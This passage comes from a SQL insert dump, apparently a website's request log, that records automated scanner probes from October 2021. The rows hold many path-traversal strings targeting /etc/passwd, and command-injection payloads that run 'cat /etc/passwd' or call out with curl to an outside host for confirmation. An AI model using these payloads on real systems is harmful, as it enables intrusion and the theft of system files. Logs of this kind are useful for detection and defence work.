12:28:58'),('null','',NULL,'/../..//../..//../..//../..//../..//etc/./////.////.///.//./passwd\0.','2021-10-09 12:28:58'),('null','',NULL,'/../..//../..//../..//../..//../..//etc/./////.////.///.//./passwd%00.','2021-10-09 12:28:58'),('null','',NULL,'/../..//../..//../..//../..//../..//etc/./////.////.///.//./passwd\0.','2021-10-09 12:28:59'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:00'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:00'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:01'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:01'),('null','',NULL,'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.\\\\\\.\\\\.\\\\.\\.\\etc\\passwd','2021-10-09 12:29:03'),('null','',NULL,'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.\\\\\\.\\\\.\\\\.\\.\\etc\\passwd','2021-10-09 12:29:03'),('null','',NULL,'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.\\\\\\.\\\\.\\\\.\\.\\etc\\passwd','2021-10-09 12:29:03'),('null','',NULL,'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.\\\\\\.\\\\.\\\\.\\.\\etc\\passwd','2021-10-09 12:29:03'),('null','',NULL,'../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:05'),('null','',NULL,'../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:05'),('null','',NULL,'../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:06'),('null','',NULL,'../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:06'),('null','',NULL,'//....//....//....//....//....//....//....//....//....//....//....//etc/./////.////.///.//./passwd','2021-10-09 12:29:07'),('null','',NULL,'//....//....//....//....//....//....//....//....//....//....//....//etc/./////.////.///.//./passwd','2021-10-09 12:29:08'),('null','',NULL,'//....//....//....//....//....//....//....//....//....//....//....//etc/./////.////.///.//./passwd','2021-10-09 12:29:08'),('null','',NULL,'//....//....//....//....//....//....//....//....//....//....//....//etc/./////.////.///.//./passwd','2021-10-09 12:29:08'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile0.php','2021-10-09 12:29:10'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile0.php','2021-10-09 12:29:10'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile0.php','2021-10-09 12:29:10'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile0.php','2021-10-09 12:29:11'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile1.php','2021-10-09 12:29:12'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile1.php','2021-10-09 12:29:12'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile1.php','2021-10-09 12:29:13'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile1.php','2021-10-09 12:29:13'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile2.php','2021-10-09 12:29:15'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile2.php','2021-10-09 12:29:15'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile2.php','2021-10-09 12:29:15'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile2.php','2021-10-09 12:29:15'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile3.php','2021-10-09 12:29:17'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile3.php','2021-10-09 12:29:17'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile3.php','2021-10-09 12:29:18'),('null','',NULL,'http://tst2.qq.com/Tst_Anyfile3.php','2021-10-09 12:29:18'),('null','',NULL,'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F.%2f%2f%2f%2f%2f.%2f%2f%2f%2f.%2f%2f%2f.%2f%2f.%2fpasswd','2021-10-09 12:29:19'),('null','',NULL,'../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:20'),('null','',NULL,'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F.%2f%2f%2f%2f%2f.%2f%2f%2f%2f.%2f%2f%2f.%2f%2f.%2fpasswd','2021-10-09 12:29:20'),('null','',NULL,'../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:20'),('null','',NULL,'?../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:22'),('null','',NULL,'?../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:22'),('null','',NULL,'?../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:22'),('null','',NULL,'?../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd','2021-10-09 12:29:23'),('null','',NULL,'file:///www.duansheli.club/../etc/./////.////.///.//./passwd','2021-10-09 12:29:24'),('null','',NULL,'file:///www.duansheli.club/../etc/./////.////.///.//./passwd','2021-10-09 12:29:24'),('null','',NULL,'file:///www.duansheli.club/../etc/./////.////.///.//./passwd','2021-10-09 12:29:25'),('null','',NULL,'file:///www.duansheli.club/../etc/./////.////.///.//./passwd','2021-10-09 12:29:25'),('null','',NULL,'\'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TSTba62ff6ae63d1029808966fc59403f60)\'','2021-10-09 12:29:27'),('null','',NULL,'\'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TSTba62ff6ae63d1029808966fc59403f60)\'','2021-10-09 12:29:27'),('null','',NULL,'\'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TSTba62ff6ae63d1029808966fc59403f60)\'','2021-10-09 12:29:27'),('null','',NULL,'\'$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TSTba62ff6ae63d1029808966fc59403f60)\'','2021-10-09 12:29:27'),('null','',NULL,'\'%0acat /etc/passwd TSTc805368053123a7de58926466298eeae%0a\'','2021-10-09 12:29:29'),('null','',NULL,'\'\ncat /etc/passwd TSTc805368053123a7de58926466298eeae\n\'','2021-10-09 12:29:29'),('null','',NULL,'\'%0acat /etc/passwd TSTc805368053123a7de58926466298eeae%0a\'','2021-10-09 12:29:30'),('null','',NULL,'\'\ncat /etc/passwd TSTc805368053123a7de58926466298eeae\n\'','2021-10-09 12:29:30'),('null','',NULL,'\"&cat /etc/passwd TST95b5f9b709e3c036146e2dd917e7e738&\"','2021-10-09 12:29:31'),('null','',NULL,'\"&cat /etc/passwd TST95b5f9b709e3c036146e2dd917e7e738&\"','2021-10-09 12:29:32'),('null','',NULL,'\"&cat /etc/passwd TST95b5f9b709e3c036146e2dd917e7e738&\"','2021-10-09 12:29:32'),('null','',NULL,'\"&cat /etc/passwd TST95b5f9b709e3c036146e2dd917e7e738&\"','2021-10-09 12:29:32'),('null','',NULL,'\";cat /etc/passwd TST37ece5f1b235dedee2957df3d88a6a82;\"','2021-10-09 12:29:34'),('null','',NULL,'\";cat /etc/passwd TST37ece5f1b235dedee2957df3d88a6a82;\"','2021-10-09 12:29:34'),('null','',NULL,'\";cat /etc/passwd TST37ece5f1b235dedee2957df3d88a6a82;\"','2021-10-09 12:29:34'),('null','',NULL,'\";cat /etc/passwd TST37ece5f1b235dedee2957df3d88a6a82;\"','2021-10-09 12:29:35'),('null','',NULL,'\"|cat /etc/passwd TST652eab8678924ba8e930deb440c2fb21|\"','2021-10-09 12:29:36'),('null','',NULL,'\"|cat /etc/passwd TST652eab8678924ba8e930deb440c2fb21|\"','2021-10-09 12:29:36'),('null','',NULL,'\"|cat /etc/passwd TST652eab8678924ba8e930deb440c2fb21|\"','2021-10-09 12:29:37'),('null','',NULL,'\"|cat /etc/passwd TST652eab8678924ba8e930deb440c2fb21|\"','2021-10-09 12:29:37'),('null','',NULL,'\"`cat /etc/passwd TSTf735fe60281a3feb781a9e28d1ff2782`\"','2021-10-09 12:29:39'),('null','',NULL,'\"`cat /etc/passwd TSTf735fe60281a3feb781a9e28d1ff2782`\"','2021-10-09 12:29:39'),('null','',NULL,'\"`cat /etc/passwd TSTf735fe60281a3feb781a9e28d1ff2782`\"','2021-10-09 12:29:39'),('null','',NULL,'\"`cat /etc/passwd TSTf735fe60281a3feb781a9e28d1ff2782`\"','2021-10-09 12:29:39'),('null','',NULL,'\"$(cat /etc/passwd TSTb7c1bb1b8a5f446fef234635462afc52)\"','2021-10-09 12:29:41'),('null','',NULL,'\"$(cat /etc/passwd TSTb7c1bb1b8a5f446fef234635462afc52)\"','2021-10-09 12:29:41'),('null','',NULL,'\"$(cat /etc/passwd TSTb7c1bb1b8a5f446fef234635462afc52)\"','2021-10-09 12:29:42'),('null','',NULL,'\"$(cat /etc/passwd TSTb7c1bb1b8a5f446fef234635462afc52)\"','2021-10-09 12:29:42'),('null','',NULL,'\"$(cat$IFS/etc/passwd$IFS/TSTd55b5bcba932218b0c151763b2dcfa1b)\"','2021-10-09 12:29:43'),('null','',NULL,'\"$(cat$IFS/etc/passwd$IFS/TSTd55b5bcba932218b0c151763b2dcfa1b)\"','2021-10-09 12:29:44'),('null','',NULL,'\"$(cat$IFS/etc/passwd$IFS/TSTd55b5bcba932218b0c151763b2dcfa1b)\"','2021-10-09 12:29:44'),('null','',NULL,'\"$(cat$IFS/etc/passwd$IFS/TSTd55b5bcba932218b0c151763b2dcfa1b)\"','2021-10-09 12:29:44'),('null','',NULL,'\"$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST7e3e642d2aabed332b266a07da435580)\"','2021-10-09 12:29:46'),('null','',NULL,'\"$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST7e3e642d2aabed332b266a07da435580)\"','2021-10-09 12:29:46'),('null','',NULL,'\"$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST7e3e642d2aabed332b266a07da435580)\"','2021-10-09 12:29:46'),('null','',NULL,'\"$(cat$IFS${BASH:0:1}etc${BASH:0:1}passwd$IFS${BASH:0:1}TST7e3e642d2aabed332b266a07da435580)\"','2021-10-09 12:29:47'),('null','',NULL,'\"%0acat /etc/passwd TSTec7d2707be943c9a0eaf167ac4933051%0a\"','2021-10-09 12:29:48'),('null','',NULL,'\"\ncat /etc/passwd TSTec7d2707be943c9a0eaf167ac4933051\n\"','2021-10-09 12:29:48'),('null','',NULL,'\"%0acat /etc/passwd TSTec7d2707be943c9a0eaf167ac4933051%0a\"','2021-10-09 12:29:49'),('null','',NULL,'\"\ncat /etc/passwd TSTec7d2707be943c9a0eaf167ac4933051\n\"','2021-10-09 12:29:49'),('null','',NULL,'B\'T_S_T_7ea27efd66d9505ecb08c6fbe5b93ff9','2021-10-09 12:29:50'),('null','',NULL,'B\'T_S_T_7ea27efd66d9505ecb08c6fbe5b93ff9','2021-10-09 12:29:51'),('null','',NULL,'B\"T_S_T_13857e0461c883c0baa58fd68b46b3ea','2021-10-09 12:29:52'),('null','',NULL,'B\"T_S_T_13857e0461c883c0baa58fd68b46b3ea','2021-10-09 12:29:52'),('null','',NULL,'B`T_S_T_f495651142e645c257740af40228a97e','2021-10-09 12:29:53'),('null','',NULL,'B`T_S_T_f495651142e645c257740af40228a97e','2021-10-09 12:29:54'),('null','',NULL,'B$(T_S_T)T_S_T_255f651f47be0120f6eddbe69a2feeb8','2021-10-09 12:29:54'),('null','',NULL,'B$(T_S_T)T_S_T_255f651f47be0120f6eddbe69a2feeb8','2021-10-09 12:29:55'),('null','',NULL,'T_S_T=T_S_T_4cb3b26e1389038dc084f42e9045f99f','2021-10-09 12:29:55'),('null','',NULL,'T_S_T=T_S_T_4cb3b26e1389038dc084f42e9045f99f','2021-10-09 12:29:56'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/c64acfa8bcf32c865727d6db0e6a12a8|\"','2021-10-09 12:29:57'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/c64acfa8bcf32c865727d6db0e6a12a8|\"','2021-10-09 12:29:57'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/c64acfa8bcf32c865727d6db0e6a12a8|\"','2021-10-09 12:29:57'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/c64acfa8bcf32c865727d6db0e6a12a8|\"','2021-10-09 12:29:57'),('null','',NULL,'\"`curl tst2.qq.com/cmd_inject/84967fa37502c51510561e8351bbd120`\"','2021-10-09 12:29:59'),('null','',NULL,'\"`curl tst2.qq.com/cmd_inject/84967fa37502c51510561e8351bbd120`\"','2021-10-09 12:29:59'),('null','',NULL,'\"`curl tst2.qq.com/cmd_inject/84967fa37502c51510561e8351bbd120`\"','2021-10-09 12:30:00'),('null','',NULL,'\"`curl tst2.qq.com/cmd_inject/84967fa37502c51510561e8351bbd120`\"','2021-10-09 12:30:00'),('null','',NULL,'\"$(curl tst2.qq.com/cmd_inject/7737f4d9c8e81912f4d6d381f4ae629e)\"','2021-10-09 12:30:01'),('null','',NULL,'\"$(curl tst2.qq.com/cmd_inject/7737f4d9c8e81912f4d6d381f4ae629e)\"','2021-10-09 12:30:02'),('null','',NULL,'\"$(curl tst2.qq.com/cmd_inject/7737f4d9c8e81912f4d6d381f4ae629e)\"','2021-10-09 12:30:02'),('null','',NULL,'\"$(curl tst2.qq.com/cmd_inject/7737f4d9c8e81912f4d6d381f4ae629e)\"','2021-10-09 12:30:02'),('null','',NULL,'\"$(curl$IFS\\tst2.qq.com/cmd_inject/84da763454f9a99602771f4391b7c3fc)\"','2021-10-09 12:30:04'),('null','',NULL,'\"$(curl$IFS\\tst2.qq.com/cmd_inject/84da763454f9a99602771f4391b7c3fc)\"','2021-10-09 12:30:04'),('null','',NULL,'\"$(curl$IFS\\tst2.qq.com/cmd_inject/84da763454f9a99602771f4391b7c3fc)\"','2021-10-09 12:30:04'),('null','',NULL,'\"$(curl$IFS\\tst2.qq.com/cmd_inject/84da763454f9a99602771f4391b7c3fc)\"','2021-10-09 12:30:05'),('null','',NULL,'\"%0acurl tst2.qq.com/cmd_inject/cba28d0432080146a3c8ad7d79792524%0a\"','2021-10-09 12:30:06'),('null','',NULL,'\"\ncurl tst2.qq.com/cmd_inject/cba28d0432080146a3c8ad7d79792524\n\"','2021-10-09 12:30:06'),('null','',NULL,'\"%0acurl tst2.qq.com/cmd_inject/cba28d0432080146a3c8ad7d79792524%0a\"','2021-10-09 12:30:07'),('null','',NULL,'\"\ncurl tst2.qq.com/cmd_inject/cba28d0432080146a3c8ad7d79792524\n\"','2021-10-09 12:30:07'),('null','',NULL,'cat /etc/passwd TSTe9f851e342c82a004e931e77206a75af','2021-10-09 12:30:08'),('null','',NULL,'cat /etc/passwd TSTe9f851e342c82a004e931e77206a75af','2021-10-09 12:30:09'),('null','',NULL,'curl tst2.qq.com/cmd_inject/fd2f6b1acf993acda1352043bf77e5ee','2021-10-09 12:30:10'),('null','',NULL,'curl tst2.qq.com/cmd_inject/fd2f6b1acf993acda1352043bf77e5ee','2021-10-09 12:30:10'),('null','',NULL,'|cat /etc/passwd TST456d282862cdf7d0113d31c38ebf2090 #','2021-10-09 12:30:11'),('null','',NULL,'|cat /etc/passwd TST456d282862cdf7d0113d31c38ebf2090 #','2021-10-09 12:30:11'),('null','',NULL,'|cat /etc/passwd TST456d282862cdf7d0113d31c38ebf2090 #','2021-10-09 12:30:12'),('null','',NULL,'|cat /etc/passwd TST456d282862cdf7d0113d31c38ebf2090 #','2021-10-09 12:30:12'),('null','',NULL,'\'|cat /etc/passwd TST50ca134638053216f572b04d6334827f #\'','2021-10-09 12:30:13'),('null','',NULL,'\'|cat /etc/passwd TST50ca134638053216f572b04d6334827f #\'','2021-10-09 12:30:14'),('null','',NULL,'\'|cat /etc/passwd TST50ca134638053216f572b04d6334827f #\'','2021-10-09 12:30:14'),('null','',NULL,'\'|cat /etc/passwd TST50ca134638053216f572b04d6334827f #\'','2021-10-09 12:30:14'),('null','',NULL,'\"|cat /etc/passwd TSTf210c2354478224d2d9a086f49b2402f #\"','2021-10-09 12:30:16'),('null','',NULL,'\"|cat /etc/passwd TSTf210c2354478224d2d9a086f49b2402f #\"','2021-10-09 12:30:16'),('null','',NULL,'\"|cat /etc/passwd TSTf210c2354478224d2d9a086f49b2402f #\"','2021-10-09 12:30:16'),('null','',NULL,'\"|cat /etc/passwd TSTf210c2354478224d2d9a086f49b2402f #\"','2021-10-09 12:30:17'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/aba062fb6f379fb97a3749e6d1f21db8|','2021-10-09 12:30:18'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/aba062fb6f379fb97a3749e6d1f21db8|','2021-10-09 12:30:18'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/aba062fb6f379fb97a3749e6d1f21db8|','2021-10-09 12:30:19'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/aba062fb6f379fb97a3749e6d1f21db8|','2021-10-09 12:30:19'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/a41aa8f047778d1ef9841d908c925435 #','2021-10-09 12:30:21'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/a41aa8f047778d1ef9841d908c925435 #','2021-10-09 12:30:21'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/a41aa8f047778d1ef9841d908c925435 #','2021-10-09 12:30:21'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/a41aa8f047778d1ef9841d908c925435 #','2021-10-09 12:30:21'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/1fd7e23a2cb9f5848ec24c89acb049c8 #\"','2021-10-09 12:30:23'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/1fd7e23a2cb9f5848ec24c89acb049c8 #\"','2021-10-09 12:30:23'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/1fd7e23a2cb9f5848ec24c89acb049c8 #\"','2021-10-09 12:30:24'),('null','',NULL,'\"|curl tst2.qq.com/cmd_inject/1fd7e23a2cb9f5848ec24c89acb049c8 #\"','2021-10-09 12:30:24'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/3d61e1dc57ddba0570ba03c005c35b94 #\'','2021-10-09 12:30:25'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/3d61e1dc57ddba0570ba03c005c35b94 #\'','2021-10-09 12:30:26'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/3d61e1dc57ddba0570ba03c005c35b94 #\'','2021-10-09 12:30:26'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/3d61e1dc57ddba0570ba03c005c35b94 #\'','2021-10-09 12:30:26'),('null','',NULL,'|cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\' |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\" |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #','2021-10-09 12:30:28'),('null','',NULL,'|cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\' |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\" |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #','2021-10-09 12:30:28'),('null','',NULL,'|cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\' |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\" |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #','2021-10-09 12:30:28'),('null','',NULL,'|cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\' |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #\" |cat /etc/passwd TST4b483575564898ea8361a2b9052db1d1 #','2021-10-09 12:30:29'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\' |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\" |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #','2021-10-09 12:30:30'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\' |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\" |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #','2021-10-09 12:30:30'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\' |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\" |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #','2021-10-09 12:30:31'),('null','',NULL,'|curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\' |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #\" |curl tst2.qq.com/cmd_inject/314ef640105bf6312228cfb2fd9c57fd #','2021-10-09 12:30:31'),('null','',NULL,'\'$(cat /etc/passwd TST1bd66ee41242644fa1485be0a9845210)\'','2021-10-09 12:30:33'),('null','',NULL,'\'$(cat /etc/passwd TST1bd66ee41242644fa1485be0a9845210)\'','2021-10-09 12:30:33'),('null','',NULL,'\'$(cat /etc/passwd TST1bd66ee41242644fa1485be0a9845210)\'','2021-10-09 12:30:33'),('null','',NULL,'\'$(cat /etc/passwd TST1bd66ee41242644fa1485be0a9845210)\'','2021-10-09 12:30:33'),('null','',NULL,'\"&curl tst2.qq.com/cmd_inject/490ff03079b7241b52cdd1200440f99e&\"','2021-10-09 12:30:35'),('null','',NULL,'\"&curl tst2.qq.com/cmd_inject/490ff03079b7241b52cdd1200440f99e&\"','2021-10-09 12:30:35'),('null','',NULL,'\"&curl tst2.qq.com/cmd_inject/490ff03079b7241b52cdd1200440f99e&\"','2021-10-09 12:30:36'),('null','',NULL,'\"&curl tst2.qq.com/cmd_inject/490ff03079b7241b52cdd1200440f99e&\"','2021-10-09 12:30:36'),('null','',NULL,'\";curl tst2.qq.com/cmd_inject/70fb3ac7c5c62618b07caa4e4871f872;\"','2021-10-09 12:30:37'),('null','',NULL,'\";curl tst2.qq.com/cmd_inject/70fb3ac7c5c62618b07caa4e4871f872;\"','2021-10-09 12:30:38'),('null','',NULL,'\";curl tst2.qq.com/cmd_inject/70fb3ac7c5c62618b07caa4e4871f872;\"','2021-10-09 12:30:38'),('null','',NULL,'\";curl tst2.qq.com/cmd_inject/70fb3ac7c5c62618b07caa4e4871f872;\"','2021-10-09 12:30:38'),('null','',NULL,'&curl tst2.qq.com/cmd_inject/f1aada585c46625a4f87f840b25a28cb&','2021-10-09 12:30:40'),('null','',NULL,'&curl tst2.qq.com/cmd_inject/f1aada585c46625a4f87f840b25a28cb&','2021-10-09 12:30:40'),('null','',NULL,'&curl tst2.qq.com/cmd_inject/f1aada585c46625a4f87f840b25a28cb&','2021-10-09 12:30:40'),('null','',NULL,'&curl tst2.qq.com/cmd_inject/f1aada585c46625a4f87f840b25a28cb&','2021-10-09 12:30:41'),('null','',NULL,';curl tst2.qq.com/cmd_inject/2b1efd364ca800198e093a8a21c48376;','2021-10-09 12:30:42'),('null','',NULL,';curl tst2.qq.com/cmd_inject/2b1efd364ca800198e093a8a21c48376;','2021-10-09 12:30:42'),('null','',NULL,';curl tst2.qq.com/cmd_inject/2b1efd364ca800198e093a8a21c48376;','2021-10-09 12:30:43'),('null','',NULL,';curl tst2.qq.com/cmd_inject/2b1efd364ca800198e093a8a21c48376;','2021-10-09 12:30:43'),('null','',NULL,'`curl tst2.qq.com/cmd_inject/6e4cc960a2bbf027822afc4389ab43cc`','2021-10-09 12:30:45'),('null','',NULL,'`curl tst2.qq.com/cmd_inject/6e4cc960a2bbf027822afc4389ab43cc`','2021-10-09 12:30:45'),('null','',NULL,'`curl tst2.qq.com/cmd_inject/6e4cc960a2bbf027822afc4389ab43cc`','2021-10-09 12:30:45'),('null','',NULL,'`curl tst2.qq.com/cmd_inject/6e4cc960a2bbf027822afc4389ab43cc`','2021-10-09 12:30:45'),('null','',NULL,'$(curl tst2.qq.com/cmd_inject/89a6ebdd841b8b8f09a9bbb72339719c)','2021-10-09 12:30:47'),('null','',NULL,'$(curl tst2.qq.com/cmd_inject/89a6ebdd841b8b8f09a9bbb72339719c)','2021-10-09 12:30:47'),('null','',NULL,'$(curl tst2.qq.com/cmd_inject/89a6ebdd841b8b8f09a9bbb72339719c)','2021-10-09 12:30:48'),('null','',NULL,'$(curl tst2.qq.com/cmd_inject/89a6ebdd841b8b8f09a9bbb72339719c)','2021-10-09 12:30:48'),('null','',NULL,'$(curl$IFS\\tst2.qq.com/cmd_inject/945298736a68f5ebb547c1c1382913b9)','2021-10-09 12:30:49'),('null','',NULL,'$(curl$IFS\\tst2.qq.com/cmd_inject/945298736a68f5ebb547c1c1382913b9)','2021-10-09 12:30:50'),('null','',NULL,'$(curl$IFS\\tst2.qq.com/cmd_inject/945298736a68f5ebb547c1c1382913b9)','2021-10-09 12:30:50'),('null','',NULL,'$(curl$IFS\\tst2.qq.com/cmd_inject/945298736a68f5ebb547c1c1382913b9)','2021-10-09 12:30:50'),('null','',NULL,'%0acurl tst2.qq.com/cmd_inject/7b39e45c94115e8f589315f5ff3b11ab%0a','2021-10-09 12:30:52'),('null','',NULL,'\ncurl tst2.qq.com/cmd_inject/7b39e45c94115e8f589315f5ff3b11ab\n','2021-10-09 12:30:52'),('null','',NULL,'%0acurl tst2.qq.com/cmd_inject/7b39e45c94115e8f589315f5ff3b11ab%0a','2021-10-09 12:30:52'),('null','',NULL,'\ncurl tst2.qq.com/cmd_inject/7b39e45c94115e8f589315f5ff3b11ab\n','2021-10-09 12:30:53'),('null','',NULL,'\'&curl tst2.qq.com/cmd_inject/63576ea514d723bc6e12073faf00f844&\'','2021-10-09 12:30:54'),('null','',NULL,'\'&curl tst2.qq.com/cmd_inject/63576ea514d723bc6e12073faf00f844&\'','2021-10-09 12:30:54'),('null','',NULL,'\'&curl tst2.qq.com/cmd_inject/63576ea514d723bc6e12073faf00f844&\'','2021-10-09 12:30:55'),('null','',NULL,'\'&curl tst2.qq.com/cmd_inject/63576ea514d723bc6e12073faf00f844&\'','2021-10-09 12:30:55'),('null','',NULL,'\';curl tst2.qq.com/cmd_inject/4d1aaa16597a2fc2174b92e7c501f52a;\'','2021-10-09 12:30:57'),('null','',NULL,'\';curl tst2.qq.com/cmd_inject/4d1aaa16597a2fc2174b92e7c501f52a;\'','2021-10-09 12:30:57'),('null','',NULL,'\';curl tst2.qq.com/cmd_inject/4d1aaa16597a2fc2174b92e7c501f52a;\'','2021-10-09 12:30:57'),('null','',NULL,'\';curl tst2.qq.com/cmd_inject/4d1aaa16597a2fc2174b92e7c501f52a;\'','2021-10-09 12:30:57'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/cbe9f162fd0a32d5c364424fcbc17727|\'','2021-10-09 12:30:59'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/cbe9f162fd0a32d5c364424fcbc17727|\'','2021-10-09 12:30:59'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/cbe9f162fd0a32d5c364424fcbc17727|\'','2021-10-09 12:31:00'),('null','',NULL,'\'|curl tst2.qq.com/cmd_inject/cbe9f162fd0a32d5c364424fcbc17727|\'','2021-10-09 12:31:00'),('null','',NULL,'\'`curl tst2.qq.com/cmd_inject/5a4591e50ffc73f29da50a9ba4aa4a63`\'','2021-10-09 12:31:01'),('null','',NULL,'\'`curl tst2.qq.com/cmd_inject/5a4591e50ffc73f29da50a9ba4aa4a63`\'','2021-10-09 12:31:02'),('null','',NULL,'\'`curl tst2.qq.com/cmd_inject/5a4591e50ffc73f29da50a9ba4aa4a63`\'','2021-10-09 12:31:02'),('null','',NULL,'\'`curl tst2.qq.com/cmd_inject/5a4591e50ffc73f29da50a9ba4aa4a63`\'','2021-10-09 12:31:02'),('null','',NULL,'\'$(curl tst2.qq.com/cmd_inject/55cfb866f25829c923a843051855b4a2)\'','2021-10-09 12:31:04'),('null','',NULL,'\'$(curl tst2.qq.com/cmd_inject/55cfb866f25829c923a843051855b4a2)\'','2021-10-09 12:31:04'),('null','',NULL,'\'$(curl tst2.qq.com/cmd_inject/55cfb866f25829c923a843051855b4a2)\'','2021-10-09 12:31:04'),('null','',NULL,'\'$(curl tst2.qq.com/cmd_inject/55cfb866f25829c923a843051855b4a2)\'','2021-10-09 12:31:05'),('null','',NULL,'\'$(curl$IFS\\tst2.qq.com/cmd_inject/8411f8366f2a6c84dd508d7407a17261)\'','2021-10-09 12:31:06'),('null','',NULL,'\'$(curl$IFS\\tst2.qq.com/cmd_inject/8411f8366f2a6c84dd508d7407a17261)\'','2021-10-09 12:31:06'),('null','',NULL,'\'$(curl$IFS\\tst2.qq.com/cmd_inject/8411f8366f2a6c84dd508d7407a17261)\'','2021-10-09 12:31:07'),('null','',NULL,'\'$(curl$IFS\\tst2.qq.com/cmd_inject/8411f8366f2a6c84dd508d7407a17261)\'','2021-10-09 12:31:07'),('null','',NULL,'\'%0acurl tst2.qq.com/cmd_inject/2eb63fffc7b34903b7cfb675ab404f00%0a\'','2021-10-09 12:31:09'),('null','',NULL,'\'\ncurl 